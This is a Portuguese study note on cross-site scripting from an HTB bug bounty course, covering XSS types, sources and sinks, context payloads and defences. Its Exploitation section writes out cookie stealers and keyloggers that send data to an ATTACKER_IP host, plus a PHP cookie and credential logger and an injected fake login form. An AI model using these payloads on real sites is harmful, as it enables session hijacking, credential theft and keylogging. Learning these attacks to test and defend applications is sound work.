---
title: "XSS Fundamentals"
---

# XSS Fundamentos — Cross-Site Scripting

> Fonte: HTB Bug Bounty Hunter Path 2024 — Módulo 19: Cross-Site Scripting (XSS)

---

## A Falha: Conteúdo do Usuário Renderizado como HTML/JavaScript

XSS existe pela mesma razão fundamental que SQLi: a aplicação não separa dados do usuário de código executável. No caso de XSS, o código executável é HTML/JavaScript, e o "interpretador" não é o banco de dados — é o browser da vítima. Quando a aplicação reflete ou armazena input do usuário sem encoding adequado, o browser não consegue distinguir o HTML que veio da aplicação dos fragmentos de HTML que vieram do input do atacante. Para o browser, tudo é código a ser executado.

A suposição de design errada é que "mostrar o que o usuário digitou" é inofensivo. O desenvolvedor escreve `"Olá, " + username + "!"` ou `<div>Resultado: ` + search_term + `</div>` sem perceber que se `username` for `<script>alert(1)</script>`, esse fragmento vai para o HTML da página e o browser vai executar o script como parte da página. O desenvolvedor pensou em dados — o browser recebeu código.

Um padrão análogo aparece em LFI: a aplicação Flask lê o parâmetro `file` da requisição e passa diretamente para `open(filename)` sem tratamento. Em ambos os casos — LFI e XSS — o input do usuário flui do ponto de entrada até um "executor" (sistema operacional no caso de LFI, browser no caso de XSS) sem passar por uma camada que separe dados de instruções.

O desenvolvedor cria essa falha sem perceber porque durante o desenvolvimento o output parece correto: digitar um nome exibe o nome. Só quando alguém digita HTML é que o problema se manifesta — e se não há testes de segurança, isso nunca é descoberto internamente. A consequência real: qualquer usuário que visualize uma página com XSS armazenado está executando código JavaScript sob controle do atacante, no contexto de segurança da aplicação — com acesso a cookies, DOM, e capacidade de fazer requisições autenticadas.

---

## Causa Raiz

O código vulnerável pega o input do usuário e o insere diretamente no HTML da resposta sem encoding:

```python
# VULNERÁVEL — input refletido diretamente no HTML
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f"<p>Resultados para: {query}</p>"  # query pode conter HTML/JS
```

```php
// VULNERÁVEL — output sem encoding
echo "Olá, " . $_GET['name'];
echo "<div>Tarefa: " . $_POST['task'] . "</div>";
```

O que está faltando é encoding do output: converter caracteres com significado especial em HTML (`<`, `>`, `"`, `'`, `&`) para suas entidades HTML correspondentes. Com encoding correto, `<script>alert(1)</script>` vira a string literal `&lt;script&gt;alert(1)&lt;/script&gt;` — exibida como texto, não executada como código.

```python
# SEGURO — encoding do output
from html import escape
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f"<p>Resultados para: {escape(query)}</p>"
```

```php
// SEGURO — htmlentities() codifica caracteres especiais
echo "Olá, " . htmlentities($_GET['name'], ENT_QUOTES, 'UTF-8');
```

O que está faltando é a distinção entre contexto de dados (onde o input é tratado como string literal) e contexto de código (onde o browser interpreta o conteúdo como HTML/JS). Sem encoding contextual, qualquer dado que contenha `<` inicia uma tag HTML.

---

## Execução de Código no Browser: Como o Input Vira Script

Uma aplicação web vulnerável recebe input do usuário e o inclui diretamente no HTML da resposta sem sanitizar ou codificar corretamente. O navegador interpreta esse input como código HTML/JavaScript e o executa.

```
Usuário → envia payload → servidor → resposta com payload embutido → navegador executa
```

O XSS é **executado no lado do cliente** (dentro do navegador). Ele não executa código no servidor diretamente, mas pode usar o contexto autenticado do usuário para fazer requisições em nome dele.

---

## Tipos e Contextos

Existem três tipos principais de XSS:

| Tipo | Persistência | Como funciona |
|------|-------------|---------------|
| **Stored (Persistente)** | Sim — salvo no banco de dados | Payload salvo no servidor; executado quando qualquer usuário carrega a página |
| **Reflected (Não-persistente)** | Não | Input devolvido na resposta HTTP sem armazenar; payload viaja na URL |
| **DOM-based** | Não | Processado inteiramente no cliente via JavaScript; nunca chega ao servidor |

### Stored XSS

O tipo mais crítico. O payload é salvo no banco de dados (ex.: campo de comentário, perfil de usuário, título de post) e executado sempre que a página é carregada. Afeta **qualquer usuário** que visitar a página.

Exemplo — payload injetado como tarefa numa To-Do list sem sanitização:

```html
<script>alert(window.origin)</script>
```

O payload persiste no código-fonte da página após refresh:

```html
<ul id="todo">
  <script>alert(window.origin)</script>
</ul>
```

O alert continuará disparando mesmo após recarregar a página — confirmando que é Stored/Persistent XSS.

### Reflected XSS

O payload é enviado ao servidor (geralmente via parâmetro GET) e devolvido na resposta imediatamente, sem ser armazenado. O ataque só funciona se a vítima clicar num link malicioso construído pelo atacante.

Exemplo — mensagem de erro que inclui o input sem sanitização:

```
GET /index.php?task=<script>alert(window.origin)</script>
```

O servidor retorna:

```html
<div>Task '<script>alert(window.origin)</script>' could not be added.</div>
```

Para explorar contra uma vítima: copie a URL completa com o payload e envie para ela via phishing.

Se a aplicação usar POST, procure como fazer o payload chegar via GET, ou use um formulário HTML auto-submit.

### DOM-based XSS

O JavaScript da página lê um valor de uma **source** (ex.: `location.hash`) e o escreve num **sink** (ex.: `innerHTML`) sem sanitizar. O payload nunca chega ao servidor — tudo acontece no browser.

Identificação: o parâmetro de input aparece após `#` na URL (hash fragment), e no Network tab do DevTools não há requisições HTTP ao digitar o valor.

Código vulnerável típico:

```javascript
// Source: lê o parâmetro da URL
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);

// Sink: escreve no DOM sem sanitização
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

Como `innerHTML` bloqueia tags `<script>`, usa-se payloads alternativos:

```html
<img src="" onerror=alert(window.origin)>
```

---

## Sources e Sinks (DOM XSS)

### Sources comuns (onde vem o input controlado pelo atacante):

| Source | Descrição |
|--------|-----------|
| `document.URL` | URL completa da página |
| `location.search` | Parâmetros de query string (`?foo=bar`) |
| `location.hash` | Fragmento da URL após `#` |
| `location.href` | URL completa |
| `document.referrer` | URL da página anterior |
| `window.name` | Nome da janela (pode ser definido cross-origin) |

### Sinks perigosos (onde o input é inserido no DOM/executado):

| Sink | Tipo de risco |
|------|---------------|
| `innerHTML` | Injeta HTML no DOM |
| `outerHTML` | Substitui o elemento inteiro por HTML |
| `document.write()` | Escreve HTML diretamente na página |
| `document.writeln()` | Idem, com newline |
| `setTimeout(str)` | Executa string como JS após delay |
| `setInterval(str)` | Executa string como JS repetidamente |
| `element.src` | Pode receber `javascript:` pseudo-protocol |
| `element.href` | Pode receber `javascript:` pseudo-protocol |

#### Funções jQuery perigosas (escrevem HTML sem sanitização):

```javascript
html()
parseHTML()
add()
append()
prepend()
after()
insertAfter()
before()
insertBefore()
replaceAll()
replaceWith()
```

---

## Identificação e Discovery

### Descoberta Automatizada

```bash
# XSS Strike — scanner popular
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "http://TARGET/index.php?task=test"
```

Saída esperada:

```
[~] Checking for DOM vulnerabilities
[+] WAF Status: Offline
[!] Testing parameter: task
[!] Reflections found: 1
[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()>
[!] Efficiency: 100
[!] Confidence: 10
```

Scanners comerciais: Nessus, Burp Suite Pro, OWASP ZAP

### Fontes de Input a Testar

Além de campos de formulário visíveis:
- Parâmetros GET e POST
- Cabeçalhos HTTP: `User-Agent`, `Referer`, `Cookie`, `X-Forwarded-For`
- Valores de fragmento de URL (após `#`)
- Campos ocultos (`type="hidden"`)

### Revisão de Código (mais confiável)

Para DOM XSS, procurar no JavaScript do frontend por sources sendo passadas a sinks:

```javascript
// VULNERÁVEL:
var task = document.URL.substring(pos + 5);
document.getElementById("todo").innerHTML = task;

// SEGURO (usando DOMPurify):
var task = DOMPurify.sanitize(document.URL.substring(pos + 5));
```

---

## Exploitation

### 1. Defacement de Página

```html
<!-- Mudar cor de fundo -->
<script>document.body.style.background = "#141d2b"</script>

<!-- Mudar background com imagem -->
<script>document.body.background = "https://www.example.com/logo.svg"</script>

<!-- Mudar título da página -->
<script>document.title = 'Site Comprometido'</script>

<!-- Substituir todo o HTML do body -->
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color:white">Hacked</h1></center>'</script>
```

### 2. Cookie Stealing (Roubo de Sessão)

O JavaScript tem acesso a `document.cookie` — exceto cookies com flag `HttpOnly`.

**Via Image src (menos visível, não redireciona a vítima):**

```javascript
new Image().src = 'http://ATTACKER_IP/index.php?c=' + document.cookie;
```

**Via redirecionamento (mais direto, mais suspeito):**

```javascript
document.location = 'http://ATTACKER_IP/index.php?c=' + document.cookie;
```

**Payload completo via Stored XSS — carregar script externo:**

```html
<script src="http://ATTACKER_IP/script.js"></script>
```

**Conteúdo de `script.js` no servidor do atacante:**

```javascript
new Image().src = 'http://ATTACKER_IP/index.php?c=' + document.cookie;
```

**Script PHP no servidor para salvar os cookies (`index.php`):**

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

**Iniciar servidor PHP para receber cookies:**

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
# Criar index.php e script.js
sudo php -S 0.0.0.0:80
```

**Usar o cookie roubado no Firefox:**
```
Shift+F9 → Storage → Cookies
Clicar em "+" → inserir Name e Value do cookie
Recarregar a página autenticada
```

### 3. Roubo de Credenciais via Formulário Falso (Phishing por XSS)

Injetar um formulário de login falso que envia dados para o servidor do atacante — remover o formulário original para não levantar suspeita:

```javascript
// Injetar form falso e remover o original
document.getElementById('urlform').remove();
var form = document.createElement('form');
form.action = 'http://ATTACKER_IP';
form.innerHTML = '<h3>Please login to continue</h3>' +
  '<input type="text" name="username" placeholder="Username">' +
  '<input type="password" name="password" placeholder="Password">' +
  '<input type="submit" value="Login">';
document.body.appendChild(form);
```

**Script PHP que salva credenciais e redireciona a vítima (`index.php`):**

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

### 4. Keylogger via XSS

```javascript
// Versão simples — envia tecla a tecla
document.onkeypress = function(e) {
    fetch('http://ATTACKER_IP/log?k=' + String.fromCharCode(e.which));
};
```

```javascript
// Versão com buffer acumulado
var keys = '';
document.onkeypress = function(e) {
    keys += String.fromCharCode(e.which);
    new Image().src = 'http://ATTACKER_IP/log?k=' + keys;
};
```

### 5. Blind XSS — Detecção e Exploração

**Blind XSS** ocorre quando o payload executa numa página inacessível ao atacante (ex.: painel de admin que revisa comentários, formulários de contato).

**Estratégia: nomear o script pelo campo sendo testado:**

```html
<!-- Quando o servidor buscar /fullname, saberemos que esse campo é vulnerável -->
<script src="http://ATTACKER_IP/fullname"></script>

<!-- Testar todos os campos -->
<script src="http://ATTACKER_IP/username"></script>
<script src="http://ATTACKER_IP/website"></script>
```

**Outros payloads para Blind XSS (diferentes contextos e filtros):**

```html
<script src=http://ATTACKER_IP></script>
'><script src=http://ATTACKER_IP></script>
"><script src=http://ATTACKER_IP></script>
```

Após identificar o campo vulnerável, trocar pelo payload de session hijacking.

### 6. Session Hijacking — Fluxo Completo

```
1. Identificar campo de input que vai para um painel de admin (ex.: campo de registro)
2. Testar payloads de remote script load identificando o campo vulnerável
3. Hospedar script.js com cookie stealer no servidor do atacante
4. Injetar: <script src="http://ATTACKER_IP/script.js"></script>
5. Aguardar o admin visitar a página com o payload
6. Receber o PHPSESSID (ou outro cookie de sessão) no servidor
7. Adicionar o cookie no browser e acessar a página autenticada
```

---

## Payloads por Contexto

### Contexto HTML (corpo da página)

```html
<!-- Básico — prova de conceito -->
<script>alert(1)</script>
<script>alert(window.origin)</script>

<!-- Alternativas quando tags script são bloqueadas pelo sink (ex: innerHTML) -->
<img src="" onerror=alert(1)>
<img src=x onerror="alert(window.origin)">
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>

<!-- Para acionar diálogo de impressão (raramente bloqueado) -->
<script>print()</script>
```

### Contexto de Atributo HTML

Se o input cai dentro de um atributo: `<div name="INPUT">`

```html
<!-- Fechar o atributo e a tag, injetar nova tag -->
"><script>alert(1)</script>

<!-- Adicionar event handler no mesmo elemento -->
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
```

### Contexto dentro de bloco JavaScript

Se o input é inserido dentro de uma string em `<script>`:

```javascript
// Código original: var x = 'INPUT';
// Payload para escapar a string e executar código:
';alert(1);//

// Código original: var x = "INPUT";
// Payload:
";alert(1);//
```

### Contexto href/src (atributos de URL)

```html
<!-- Se o input vira o href de um link ou src de um script -->
javascript:alert(1)
```

---

## Ferramentas

| Ferramenta | Uso |
|------------|-----|
| XSS Strike | Scanner automatizado open-source |
| Brute XSS | Bruteforce de payloads |
| XSSer | Scanner automatizado |
| Burp Suite Pro | Scanner com bypass avançado |
| OWASP ZAP | Scanner open-source |
| DOMPurify | Sanitização (defesa) |
| PayloadAllTheThings | Lista de payloads |

---

## Detecção e Mitigação

### Front-end

**Sanitização com DOMPurify:**

```html
<script type="text/javascript" src="dist/purify.min.js"></script>
```

```javascript
let clean = DOMPurify.sanitize(dirty);
```

**Evitar usar input direto nestes contextos:**
- `<script>`, `<style>`, comentários HTML
- Atributos de tag: `<div name='INPUT'>`
- Funções DOM: `innerHTML`, `outerHTML`
- jQuery: `html()`, `parseHTML()`, `append()`, `prepend()`, etc.

### Back-end

**Validação (PHP):**

```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // processar
} else {
    // rejeitar — não exibir o input
}
```

**Encoding de output:**

```php
htmlentities($_GET['email']);
// Converte: < → &lt;   > → &gt;   " → &quot;   ' → &#039;
```

**Node.js:**

```javascript
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```

### Configuração do Servidor

- HTTPS em todo o domínio
- Cabeçalho `Content-Security-Policy: script-src 'self'`
- Cabeçalho `X-Content-Type-Options: nosniff`
- Flags de cookie: `HttpOnly` (impede acesso via JS) + `Secure` (só HTTPS)
- WAF (Web Application Firewall)

### Checklist de Detecção

- [ ] Mapear todos os pontos de input: campos de form, parâmetros GET/POST, headers HTTP
- [ ] Verificar como o input é refletido no HTML (`Ctrl+U` vs DevTools Inspector)
- [ ] Testar payload básico: `<script>alert(window.origin)</script>`
- [ ] Se bloqueado: testar `<img src="" onerror=alert(1)>`, `<svg onload=alert(1)>`
- [ ] Verificar se persiste após refresh (Stored) ou some (Reflected/DOM)
- [ ] Para DOM XSS: verificar parâmetros após `#` na URL; inspecionar JS do frontend
- [ ] Para Blind XSS: usar remote script load com nome do campo como path
- [ ] Verificar headers de segurança: `Content-Security-Policy`, cookie flags

---

## Impacto e Exploitation

### Escala de Criticidade

| Tipo | Impacto | Alcance |
|------|---------|---------|
| Stored XSS | Alto | Todos os usuários que visitam a página |
| Reflected XSS | Médio | Usuários que clicam no link malicioso |
| DOM XSS | Médio | Usuários que clicam no link malicioso |
| Blind XSS | Alto | Administradores/revisores do conteúdo |

### O que pode ser feito com execução JS arbitrária

1. **Cookie/Session Hijacking** — roubar sessão autenticada
2. **Credential Harvesting** — capturar senhas via formulário falso
3. **Keylogging** — capturar todo input do usuário
4. **Internal Network Scanning** — usar o browser da vítima para atacar serviços internos
5. **XSS + CSRF chaining** — fazer ações autenticadas em nome da vítima
6. **Account Takeover** — mudar email/senha da vítima
7. **Defacement** — comprometer a imagem da empresa publicamente
8. **Browser Exploitation** — usar XSS para entregar exploits de navegador

---

## Módulos Relacionados

O módulo [`02_xss_avancado_e_filter_bypass.md`](02_xss_avancado_e_filter_bypass.md) cobre bypass de filtros, evasão de CSP e técnicas avançadas de exploração que complementam os fundamentos aqui apresentados. Para encadear XSS com ações autenticadas em nome da vítima, consulte [`03_csrf.md`](03_csrf.md). O módulo [`04_prototype_pollution.md`](04_prototype_pollution.md) trata de prototype pollution como vetor alternativo para XSS client-side, aproveitando gadgets JavaScript já presentes na aplicação.
